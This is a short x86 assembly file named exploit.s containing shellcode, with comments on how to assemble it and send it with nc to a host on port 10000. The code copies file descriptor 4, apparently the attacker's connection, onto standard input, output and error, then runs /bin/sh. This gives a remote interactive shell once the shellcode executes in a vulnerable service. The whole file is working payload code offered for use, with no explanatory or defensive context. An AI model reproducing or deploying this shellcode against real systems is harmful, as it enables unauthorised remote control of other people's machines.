.intel_syntax noprefix

# as -o exploit.o exploit.s
# objcopy -O binary exploit.o exploit.raw
# (cat exploit.raw; cat -)  | nc 192.168.0.25 10000
.globl main
main:

mov esi, 0x4
# dup2(clientfd,0);
mov ecx, 0x0
mov ebx, esi
mov eax, 0x3f
int 0x80

# dup2(clientfd,1); 
mov ecx, 0x1
mov ebx, esi
mov eax, 0x3f
int 0x80

# dup2(clientfd,2);
mov ecx, 0x2
mov ebx, esi
mov eax, 0x3f
int 0x80


push 0x0068732f
push 0x6e69622f

mov edx, 0
mov ecx, 0
mov ebx, esp
mov eax, 0xb
int 0x80

mov ebx, 0
mov eax, 1
int 0x80
